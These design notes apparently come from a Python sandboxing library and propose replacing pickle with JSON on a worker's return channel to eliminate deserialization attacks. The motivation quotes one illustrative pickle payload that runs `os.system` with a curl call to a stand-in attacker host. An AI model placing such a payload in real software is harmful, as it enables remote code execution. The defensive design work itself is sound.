# Ideas & Design Notes

## `@nonet_json` — a safer, JSON-only return channel

### Motivation

The current `@nonet` decorator uses `pickle` for both directions of the
worker pipe (parent→child for args/kwargs, child→parent for the return
value). Pickle is expressive but dangerous on the **child→parent** leg:
a crafted `__reduce__` method can encode an arbitrary callable that executes
in the **unrestricted parent process** when `pickle.loads()` is called.

The `SafePickle` mitigation addresses this with a `RestrictedUnpickler`
that whitelists modules at `find_class()` time.  The whitelist must be
maintained carefully — adding `"os"` to it, for example, immediately
re-opens the network-bypass hole because an attacker could encode
`(os.system, ("curl http://evil.com",))` and have it run in the parent.

A structurally simpler alternative: **use JSON for the return channel**.
JSON has no `__reduce__` / `find_class` mechanism whatsoever, so the
attack surface disappears by construction rather than by enumeration.

---

### Design

Introduce a thin `Codec` abstraction and factor the fork/seccomp/mitigation
engine into `_make_nonet(codec)`:

```python
nonet      = _make_nonet(codec=PickleCodec())  # existing behaviour
nonet_json = _make_nonet(codec=JsonCodec())    # JSON-only, no whitelist needed
```

#### `JsonCodec` sketch

```python
import json

class JsonCodec:
    # ── child → parent (the dangerous direction) ────────────────────────────

    def encode_result(self, tag: str, value) -> bytes:
        if tag == "err":
            # Exceptions aren't JSON-serializable; preserve type name + message.
            value = {"type": type(value).__name__, "msg": str(value)}
        return json.dumps([tag, value]).encode()

    def decode_result(self, raw: bytes):
        tag, value = json.loads(raw)
        if tag == "err":
            # Lose the original traceback but keep a readable message.
            raise RuntimeError(f"{value['type']}: {value['msg']}")
        return value

    # ── parent → child (less critical, but consistent) ──────────────────────

    def encode_request(self, args: tuple, kwargs: dict) -> bytes:
        return json.dumps([list(args), kwargs]).encode()

    def decode_request(self, raw: bytes):
        args, kwargs = json.loads(raw)
        return tuple(args), kwargs
```

#### `PickleCodec` (wraps existing logic)

```python
class PickleCodec:
    def encode_result(self, tag, value):
        return pickle.dumps((tag, value))

    def decode_result(self, raw):
        return _deserialize_result(raw)   # runs SafePickle mitigation chain

    def encode_request(self, args, kwargs):
        return pickle.dumps((args, kwargs))

    def decode_request(self, raw):
        return pickle.loads(raw)
```

---

### Tradeoffs

| Property | `@nonet` (pickle) | `@nonet_json` (JSON) |
|---|---|---|
| Return types | Any pickleable object | JSON primitives only (dict, list, str, int, float, bool, None) |
| Exception fidelity | Full exception object | Type name + message string only |
| Pickle RCE risk | Mitigated by `SafePickle` whitelist | Eliminated by construction |
| Whitelist maintenance | Required | Not needed |
| Custom class returns | ✅ (if whitelisted) | ❌ |

---

### Exception fidelity improvement (optional)

If losing the original exception type is unacceptable, a small registry can
reconstruct stdlib exceptions by name rather than always raising `RuntimeError`:

```python
import builtins

_EXC_REGISTRY = {
    name: obj
    for name, obj in vars(builtins).items()
    if isinstance(obj, type) and issubclass(obj, BaseException)
}

def decode_result(self, raw):
    tag, value = json.loads(raw)
    if tag == "err":
        exc_cls = _EXC_REGISTRY.get(value["type"], RuntimeError)
        raise exc_cls(value["msg"])
    return value
```

This covers all built-in exceptions (`OSError`, `ValueError`, etc.) without
re-introducing arbitrary class resolution.

---

### Implementation steps

1. Define `Codec` protocol / base class in `main.py` (or `codecs.py`).
2. Implement `PickleCodec` (refactored from current code) and `JsonCodec`.
3. Change `_start_worker(fn, state)` to `_start_worker(fn, state, codec)`.
4. Change `wrapper` to use `codec.encode_request` / `codec.decode_result`.
5. Expose `nonet_json = _make_nonet(codec=JsonCodec())` at module level.
6. `SafePickle` mitigation remains but is only exercised by `PickleCodec` —
   `JsonCodec` bypasses the mitigation chain for `on_parent_result` entirely.
7. Add `test_nonet_json.py` covering the JSON-specific behaviour and
   verifying that the RCE payload raises a plain `json.JSONDecodeError` /
   is structurally impossible.
